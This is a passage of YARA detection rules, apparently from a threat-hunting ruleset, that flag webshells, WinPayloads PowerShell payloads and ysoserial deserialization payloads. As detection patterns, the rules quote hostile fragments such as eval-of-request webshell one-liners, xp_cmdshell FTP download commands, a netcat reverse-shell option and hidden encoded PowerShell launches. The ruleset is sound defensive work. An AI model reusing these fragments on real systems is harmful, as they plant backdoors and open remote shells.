from Chinese toolkit (file: temp.asp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_temp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"o.run \\\"ff\\\",Server,Response,Request,Application,Session,Error\" fullword ascii\n        $s1 = \"Set o = Server.CreateObject(\\\"ScriptControl\\\")\" fullword ascii\n        $s2 = \"o.language = \\\"vbscript\\\"\" fullword ascii\n        $s3 = \"o.addcode(Request(\\\"SC\\\"))\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN_2015\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: 2015.jsp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_2015\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Configbis = new BufferedInputStream(httpUrl.getInputStream());\" fullword ascii\n        $s4 = \"System.out.println(Oute.toString());\" fullword ascii\n        $s5 = \"String ConfigFile = Outpath + \\\"/\\\" + request.getParameter(\\\"ConFile\\\");\" fullword ascii\n        $s8 = \"HttpURLConnection httpUrl = null;\" fullword ascii\n        $s19 = \"Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;\" fullword ascii\n\n    condition:\n        filesize < 7KB and all of them\n}\n\nrule Webshell_ChinaChopper_temp_2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: temp.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_temp_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"@eval($_POST[strtoupper(md5(gmdate(\" ascii\n\n    condition:\n        filesize < 150 and all of them\n}\n\nrule Webshell_CN_templatr\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: templatr.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"templatr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"eval(gzinflate(base64_decode('\" ascii\n\n    condition:\n        filesize < 70KB and all of them\n}\n\nrule Webshell_CN_reDuhServers_reDuh_3\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: reDuh.aspx)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"reDuhServers_reDuh_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Response.Write(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +\" ascii\n        $s2 = \"host = System.Net.Dns.Resolve(\\\"127.0.0.1\\\");\" fullword ascii\n        $s3 = \"rw.WriteLine(\\\"[newData]\\\" + targetHost + \\\":\\\" + targetPort + \\\":\\\" + socketNum\" ascii\n        $s4 = \"Response.Write(\\\"Error: Bad port or host or socketnumber for creating new socket\" ascii\n\n    condition:\n        filesize < 40KB and all of them\n}\n\nrule Webshell_ChinaChopper_temp_3\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: temp.aspx)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_temp_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\\\"\" ascii\n        $s1 = \"\\\"],\\\"unsafe\\\");%>\" ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 150 and all of them\n}\n\nrule Webshell_CN_Shell_Asp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Asp.html)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Shell_Asp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n        $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n        $s3 = \"function Command(cmd, str){\" fullword ascii\n\n    condition:\n        filesize < 100KB and all of them\n}\n\nrule Webshell_CN_Txt_aspxtag\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspxtag.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_aspxtag\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"String wGetUrl=Request.QueryString[\" fullword ascii\n        $s2 = \"sw.Write(wget);\" fullword ascii\n        $s3 = \"Response.Write(\\\"Hi,Man 2015\\\"); \" fullword ascii\n\n    condition:\n        filesize < 2KB and all of them\n}\n\nrule Webshell_CN_Txt_php\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_php\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Config=$_SERVER['QUERY_STRING'];\" fullword ascii\n        $s2 = \"gzuncompress($_SESSION['api']),null);\" ascii\n        $s3 = \"sprintf('%s?%s',pack(\\\"H*\\\",\" ascii\n        $s4 = \"if(empty($_SESSION['api']))\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN_Txt_aspx1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx1.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_aspx1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\"\n        $s1 = \"],\\\"unsafe\\\");%>\" fullword ascii\n\n    condition:\n        filesize < 150 and all of them\n}\n\nrule Webshell_CN_Txt_shell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: shell.c)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"printf(\\\"Could not connect to remote shell!\\\\n\\\");\" fullword ascii\n        $s2 = \"printf(\\\"Usage: %s <reflect ip> <port>\\\\n\\\", prog);\" fullword ascii\n        $s3 = \"execl(shell,\\\"/bin/sh\\\",(char *)0);\" fullword ascii\n        $s4 = \"char shell[]=\\\"/bin/sh\\\";\" fullword ascii\n        $s5 = \"connect back door\\\\n\\\\n\\\");\" fullword ascii\n\n    condition:\n        filesize < 2KB and 2 of them\n}\n\nrule Webshell_CN_Txt_asp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_asp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol\" ascii\n        $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 100KB and all of them\n}\n\nrule Webshell_CN_Txt_asp1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp1.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_asp1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n        $s2 = \"autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)\" fullword ascii\n        $s3 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n        $s4 = \"szTempFile = server.mappath(\\\"cmd.txt\\\")\" fullword ascii\n\n    condition:\n        filesize < 70KB and 2 of them\n}\n\nrule Webshell_CN_Txt_php_2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php.html)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_php_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"function connect($dbhost, $dbuser, $dbpass, $dbname='') {\" fullword ascii\n        $s2 = \"scookie('loginpass', '', -86400 * 365);\" fullword ascii\n        $s3 = \"<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>\" fullword ascii\n        $s4 = \"Powered by <a title=\\\"Build 20130112\\\" href=\\\"http://www.4ngel.net\\\" target=\\\"_b\" ascii\n        $s5 = \"formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\\\'shell\\\\',null,this.\" ascii\n        $s6 = \"secparam('IP Configurate',execute('ipconfig -all'));\" fullword ascii\n        $s7 = \"secparam('Hosts', @file_get_contents('/etc/hosts'));\" fullword ascii\n        $s8 = \"p('<p><a href=\\\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\\\" target=\" ascii\n\n    condition:\n        filesize < 100KB and 4 of them\n}\n\nrule Webshell_CN_Txt_ftp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: ftp.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_ftp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"';exec master.dbo.xp_cmdshell 'echo open \" ascii\n        $s2 = \"';exec master.dbo.xp_cmdshell 'ftp -s:';\" ascii\n        $s3 = \"';exec master.dbo.xp_cmdshell 'echo get lcx.exe\" ascii\n        $s4 = \"';exec master.dbo.xp_cmdshell 'echo get php.exe\" ascii\n        $s5 = \"';exec master.dbo.xp_cmdshell 'copy \" ascii\n        $s6 = \"ftp -s:d:\\\\ftp.txt \" fullword ascii\n        $s7 = \"echo bye>>d:\\\\ftp.txt \" fullword ascii\n\n    condition:\n        filesize < 2KB and 2 of them\n}\n\nrule Webshell_CN_Txt_lcx\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: lcx.c)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_lcx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"printf(\\\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l\" ascii\n        $s2 = \"sprintf(tmpbuf2,\\\"\\\\r\\\\n########### reply from %s:%d ####################\\\\r\\\\n\" ascii\n        $s3 = \"printf(\\\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\\\r\\\\n\\\");\" fullword ascii\n        $s4 = \"printf(\\\"got,ip:%s,port:%d\\\\r\\\\n\\\",inet_ntoa(client1.sin_addr),ntohs(client1.sin\" ascii\n        $s5 = \"printf(\\\"[-] connect to host1 failed\\\\r\\\\n\\\");\" fullword ascii\n\n    condition:\n        filesize < 25KB and 2 of them\n}\n\nrule Webshell_CN_Txt_jspcmd\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jspcmd.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_jspcmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n        $s4 = \"out.print(\\\"Hi,Man 2015\\\");\" fullword ascii\n\n    condition:\n        filesize < 1KB and 1 of them\n}\n\nrule Webshell_CN_Txt_jsp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jsp.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_jsp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n        $s2 = \"Process pro = Runtime.getRuntime().exec(exe);\" fullword ascii\n        $s3 = \"<option value=\\\\\\\"nc -e cmd.exe 192.168.230.1 4444\\\\\\\">nc</option>\\\"\" fullword ascii\n        $s4 = \"cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n\n    condition:\n        filesize < 715KB and 2 of them\n}\n\nrule Webshell_CN_Txt_aspxlcx\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspxlcx.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_aspxlcx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"public string remoteip = \" ascii\n        $s2 = \"=Dns.Resolve(host);\" ascii\n        $s3 = \"public string remoteport = \" ascii\n        $s4 = \"public class PortForward\" ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 18KB and all of them\n}\n\nrule Webshell_CN_Txt_xiao\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: xiao.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_xiao\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n        $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n        $s3 = \"conn.Execute(\\\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,\" ascii\n        $s4 = \"function Command(cmd, str){\" fullword ascii\n        $s5 = \"echo \\\"if(obj.value=='PageWebProxy')obj.form.target='_blank';\\\"\" fullword ascii\n\n    condition:\n        filesize < 100KB and all of them\n}\n\nrule Webshell_CN_Txt_aspx\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx.jpg)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_aspx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n        $s2 = \"Process[] p=Process.GetProcesses();\" fullword ascii\n        $s3 = \"Copyright &copy; 2009 Bin\" ascii\n        $s4 = \"<td colspan=\\\"5\\\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\\\"input\\\" runat=\\\"serv\" ascii\n\n    condition:\n        filesize < 100KB and all of them\n}\n\nrule Webshell_CN_Txt_Sql\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Sql.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_Sql\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd=chr(34)&\\\"cmd.exe /c \\\"&request.form(\\\"cmd\\\")&\\\" > 8617.tmp\\\"&chr(34)\" fullword ascii\n        $s2 = \"strQuery=\\\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\\\"\" fullword ascii\n        $s3 = \"strQuery = \\\"exec master.dbo.xp_cmdshell '\\\" & request.form(\\\"cmd\\\") & \\\"'\\\" \" fullword ascii\n        $s4 = \"session(\\\"login\\\")=\\\"\\\"\" fullword ascii\n\n    condition:\n        filesize < 15KB and all of them\n}\n\nrule Webshell_CN_Txt_hello\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: hello.txt)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Txt_hello\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Dim myProcessStartInfo As New ProcessStartInfo(\\\"cmd.exe\\\")\" fullword ascii\n        $s1 = \"myProcessStartInfo.Arguments=\\\"/c \\\" & Cmd.text\" fullword ascii\n        $s2 = \"myProcess.Start()\" fullword ascii\n        $s3 = \"<p align=\\\"center\\\"><a href=\\\"?action=cmd\\\" target=\\\"_blank\\\">\" fullword ascii\n\n    condition:\n        filesize < 25KB and all of them\n}\n\nrule b374k_back_connect\n{\n    meta:\n        description = \"b374k webshell\"\n        classifications = \"Backdoor\"\n        threat_names = \"b374k\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"b374k_back_connect\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"AddAtomACreatePro\" fullword ascii\n        $s2 = \"shutdow\" fullword ascii\n        $s3 = \"/config/i386\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 10KB and all of them)\n}\n\nrule Webshell_ChinaChopper_Generic\n{\n    meta:\n        description = \"China Chopper Webshell\"\n        ref = \"https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf\"\n        classifications = \"Backdoor\"\n        threat_names = \"China Chopper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $aspx = /%@\\sPage\\sLanguage=.Jscript.%><%eval\\(RequestItem\\[.{,100}unsafe/\n        $php = /<?php.\\@eval\\(\\$_POST./\n\n    condition:\n        1 of them\n}\n\nrule WinPayloads_PowerShell\n{\n    meta:\n        description = \"WinPayloads PowerShell payload\"\n        threat_names = \"WinPayloads\"\n        ref = \"https://github.com/nccgroup/Winpayloads\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WinPayloads_PowerShell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"$Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHBqCCA9AwggPMAgEAMIIDxQYJKoZIhvcNAQcBMBwGCiqGSIb3D\" ascii\n        $x2 = \"powershell -w hidden -noni -enc SQBF\" fullword ascii nocase\n        $x3 = \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA\" ascii\n        $x4 = \"powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA\" ascii\n\n    condition:\n        filesize < 10KB and 1 of them\n}\n\nrule WinPayloads_Payload\n{\n    meta:\n        description = \"WinPayloads payload\"\n        threat_names = \"WinPayloads\"\n        ref = \"https://github.com/nccgroup/Winpayloads\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WinPayloads_Payload\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"bpayload.exe.manifest\" fullword ascii\n        $s2 = \"spayload\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 10000KB and all of them)\n}\n\nrule Ysoserial_Payload_MozillaRhino1\n{\n    meta:\n        description = \"Ysoserial payload (file: MozillaRhino1.bin)\"\n        threat_names = \"Ysoserial\"\n        ref = \"https://github.com/frohoff/ysoserial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ysoserial_Payload_MozillaRhino1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \"ysoserial.payloads\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xedac and filesize < 40KB and all of them)\n}\n\nrule Ysoserial_Payload_C3P0\n{\n    meta:\n        description = \"Ysoserial payload (file: C3P0.bin)\"\n        threat_names = \"Ysoserial\"\n        ref = \"https://github.com/frohoff/ysoserial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ysoserial_Payload_C3P0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"exploitppppw\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xedac and filesize < 3KB and all of them)\n}\n\nrule Ysoserial_Payload_Spring1\n{\n    meta:\n        description = \"Ysoserial payload (file: Spring1.bin)\"\n        threat_names = \"Ysoserial\"\n        ref = \"https://github.com/frohoff/ysoserial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ysoserial_Payload_Spring1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\u001fysoserial/Pwner\" ascii\n\n    condition:\n        1 of them\n}\n\nrule Ysoserial_Payload\n{\n    meta:\n        description = \"Ysoserial payload\"\n        threat_names = \"Ysoserial\"\n        ref = \"https://github.com/frohoff/ysoserial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ysoserial_Payload\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ysoserial/payloads/\" ascii\n        $s1 = \"StubTransletPayload\" fullword ascii\n        $s2 = \"Pwnrpw\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xedac and filesize < 40KB and $x1) or (all of them)\n}\n\nrule Ysoserial_Payload_3\n{\n    meta:\n        description = \"Ysoserial payload (files: JavassistWeld1.bin, JBossInterceptors.bin)\"\n        threat_names = \"Ysoserial\"\n        ref = \"https://github.com/frohoff/ysoserial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ysoserial_Payload_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ysoserialq\" fullword ascii\n        $s1 = \"targetClassInterceptorMetadatat\" fullword ascii\n        $s2 = \"targetInstancet\" fullword ascii\n        $s3 = \"targetClassL\" fullword ascii\n        $s4 = \"POST_ACTIVATEsr\" fullword ascii\n        $s5 = \"PRE_DESTROYsq\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xedac and filesize < 10KB and $x1) or (all of them)\n}",
      "send_mail": false,
      "shareable": true
    }
  }
}